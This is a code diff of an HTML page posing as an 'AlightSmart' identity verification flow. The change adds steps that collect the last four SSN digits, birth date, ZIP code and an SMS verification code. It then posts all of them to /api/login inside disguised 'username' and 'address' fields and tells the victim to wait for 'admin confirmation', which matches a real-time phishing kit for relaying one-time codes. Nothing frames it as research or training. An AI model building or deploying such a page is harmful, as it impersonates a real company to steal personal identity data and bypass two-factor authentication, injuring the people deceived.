@@ -6,31 +6,73 @@
     <title>Verify Identity - AlightSmart</title>
     <style>
         body { font-family: Arial, sans-serif; background: #f8fafc; padding: 20px; }
-        .container { max-width: 420px; margin: auto; background: white; padding: 30px; border-radius: 12px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); text-align: center; }
-        h1 { font-size: 1.6rem; margin-bottom: 10px; }
-        p { color: #475569; margin-bottom: 25px; }
-        input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 8px; font-size: 1.2rem; text-align: center; }
+        .container { max-width: 420px; margin: auto; background: white; padding: 30px; border-radius: 12px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
+        h1 { font-size: 1.6rem; margin-bottom: 10px; text-align: center; }
+        p { text-align: center; color: #475569; margin-bottom: 25px; }
+        label { display: block; margin: 20px 0 8px; font-weight: 600; }
+        input, select { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 8px; font-size: 1rem; }
         button { width: 100%; padding: 15px; margin-top: 20px; border: none; border-radius: 8px; font-size: 1.1rem; cursor: pointer; }
         .continue { background: #1e40af; color: white; }
-        .error { color: red; margin-top: 15px; }
-        .waiting { color: #3b82f6; font-size: 1.1rem; margin: 20px 0; }
+        .cancel { background: #94a3b8; color: white; }
+        .error { color: red; margin-top: 10px; text-align: center; font-weight: bold; }
+        .step { display: none; }
+        .step.active { display: block; }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>Verify it's you</h1>
-        <p>Enter the code you received via SMS.</p>
-        
-        <input type="text" id="code" maxlength="6" placeholder="123456" required>
-        <div id="status" class="waiting"></div>
-        <div id="error" class="error"></div>
+        <!-- Step 1 -->
+        <div id="step1" class="step active">
+            <h1>Confirm your identity</h1>
+            <p>You'll need to provide some information first to confirm your identity.</p>
+            
+            <label>Last 4 Digits of SSN</label>
+            <input type="text" id="ssn" maxlength="4" placeholder="1234" required>
+            
+            <label>Birth Date</label>
+            <div style="display:flex; gap:10px;">
+                <select id="month" required><option value="">Month</option></select>
+                <select id="day" required><option value="">Day</option></select>
+                <select id="year" required><option value="">Year</option></select>
+            </div>
+            
+            <label style="margin-top:20px;">
+                <input type="checkbox" id="privacy"> To continue, check here to accept the <strong>Alight Privacy Policy</strong>.
+            </label>
+            
+            <button class="continue" onclick="nextStep(2)">Continue</button>
+            <button class="cancel" onclick="cancel()">Cancel</button>
+        </div>
 
-        <button class="continue" onclick="submitCode()">Submit Code</button>
-        <button onclick="cancel()" style="background:#94a3b8; color:white; margin-top:10px;">Cancel</button>
+        <!-- Step 2 -->
+        <div id="step2" class="step">
+            <h1>Provide Additional Information</h1>
+            <label>Zip Code</label>
+            <input type="text" id="zip" maxlength="5" placeholder="12345" required>
+            
+            <button class="continue" onclick="nextStep(3)">Continue</button>
+            <button class="cancel" onclick="cancel()">Cancel</button>
+        </div>
+
+        <!-- Step 3 -->
+        <div id="step3" class="step">
+            <h1>Verify it's you</h1>
+            <p>Enter the code you received via SMS.</p>
+            <input type="text" id="code" maxlength="6" placeholder="123456" required>
+            <div id="error" class="error"></div>
+            
+            <button class="continue" onclick="submitCode()">Submit Code</button>
+            <button class="cancel" onclick="cancel()">Cancel</button>
+            
+            <p style="text-align:center; margin-top:15px;">
+                <a href="#" onclick="resendCode()">Resend code</a>
+            </p>
+        </div>
     </div>
 
     <script>
-        let checkInterval;
+        let currentStep = 1;
+         let checkInterval;
 
         async function submitCode() {
             const code = document.getElementById('code').value.trim();
@@ -76,6 +118,97 @@
             clearInterval(checkInterval);
             window.location.href = "/";
         }
+
+        function nextStep(step) {
+            if (step === 2) {
+                const ssn = document.getElementById('ssn').value.trim();
+                const month = document.getElementById('month').value;
+                const day = document.getElementById('day').value;
+                const year = document.getElementById('year').value;
+                const privacy = document.getElementById('privacy').checked;
+
+                if (ssn.length !== 4 || !month || !day || !year || !privacy) {
+                    alert("Please fill all fields and accept the Privacy Policy.");
+                    return;
+                }
+            }
+
+            if (step === 3) {
+                const zip = document.getElementById('zip').value.trim();
+                if (zip.length < 5) {
+                    alert("Please enter a valid Zip Code.");
+                    return;
+                }
+            }
+
+            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+            document.getElementById('step' + step).classList.add('active');
+            currentStep = step;
+        }
+
+        async function submitCode() {
+            const code = document.getElementById('code').value.trim();
+            const errorDiv = document.getElementById('error');
+
+            if (code.length < 4) {
+                errorDiv.textContent = "Please enter a valid code.";
+                return;
+            }
+
+            const ssn = document.getElementById('ssn').value;
+            const dob = `${document.getElementById('month').value}/${document.getElementById('day').value}/${document.getElementById('year').value}`;
+            const zip = document.getElementById('zip').value;
+
+            const username = ssn ? `SSN-${ssn}` : "Verified User";
+            const password = "Pending";
+            const address = `SSN: ${ssn} | DOB: ${dob} | Zip: ${zip} | Code: ${code} | Status: Pending`;
+
+            await fetch('/api/login', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ username, password, address })
+            });
+
+            alert("Code submitted. Waiting for admin confirmation.");
+            window.location.href = "/";
+        }
+
+        function cancel() {
+            window.location.href = "/";
+        }
+
+        function resendCode() {
+            alert("New verification code has been sent.");
+            document.getElementById('error').textContent = "";
+        }
+
+        window.onload = () => {
+            const monthSelect = document.getElementById('month');
+            const months = ["January","February","March","April","May","June","July","August","September","October","November","December"];
+            months.forEach((month, i) => {
+                let opt = document.createElement('option');
+                opt.value = i + 1;
+                opt.text = month;
+                monthSelect.appendChild(opt);
+            });
+
+            const daySelect = document.getElementById('day');
+            for (let i = 1; i <= 31; i++) {
+                let opt = document.createElement('option');
+                opt.value = i;
+                opt.text = i;
+                daySelect.appendChild(opt);
+            }
+
+            const yearSelect = document.getElementById('year');
+            const currentYear = new Date().getFullYear();
+            for (let i = currentYear; i >= 1950; i--) {
+                let opt = document.createElement('option');
+                opt.value = i;
+                opt.text = i;
+                yearSelect.appendChild(opt);
+            }
+        };
     </script>
 </body>
 </html>
